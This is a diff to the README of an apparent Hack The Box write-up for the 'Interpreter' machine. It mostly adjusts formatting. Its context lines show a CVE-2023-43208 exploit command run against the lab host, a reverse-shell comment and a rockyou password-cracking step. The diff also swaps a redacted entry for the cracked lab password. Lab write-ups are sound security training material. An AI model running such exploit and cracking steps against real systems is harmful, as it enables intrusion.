@@ -1,8 +1,21 @@
+<p align="center">
+  <img src="https://www.hackthebox.com/images/logo-htb.svg" width="180">
+</p>
+
+<h1 align="center">Hack The Box – Machine Writeups</h1>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black">
+  <img src="https://img.shields.io/badge/Category-Machines-black?style=for-the-badge">
+</p>
+
 # 🏆 **Interpreter - HackTheBox Writeup**
-![Interpreter Banner](solved_machine_banner.PNG)
+<p align="center">
+    ![Interpreter Banner](solved_machine_banner.PNG)
 ## **Machine:** Linux | **Difficulty:** Medium | **Name:** Interpreter
 ### **Achievement Link:** [https://labs.hackthebox.com/achievement/machine/847519/841](https://labs.hackthebox.com/achievement/machine/847519/841)
 ### **Pwned By:** Saurabh Tomar | **Date:** 23 Feb 2026 | **Points:** 45
+</p>
 
 ---
 
@@ -82,7 +95,7 @@ python3 CVE-2023-43208.py -t https://interpreter.htb -c "id"
 
 # Response shows mirth user
 uid=1001(mirth) gid=1001(mirth) groups=1001(mirth)
-```
+
 
 ```bash
 # Execute command for revershell
@@ -252,7 +265,7 @@ crack_pbkdf2_sha256("/usr/share/wordlists/rockyou.txt",
 
 After some time, the password cracked:
 ```
-Password: [REDACTED]
+[+] Password found: snowflake1
 ```
 
 ---
@@ -488,32 +501,9 @@ We have **euid=0(root)** - Privilege Escalation successful!
 ---
 
 # 🎉 **Machine Solved!**
-
+<p align="center">
 ![Machine Solved](solved_machine_banner.PNG)
-
-```
-INTERPRETER
-
-You have solved Interpreter!
-
-Congratulations
-
-Saurabhtomar
-
-best of luck in capturing flags ahead!
-
-#2192
-
-23Feb2026
-
-45
-
-Machine Rank
-
-Pwn Date
-
-Points Earned
-```
+</p>
 
 ---
 
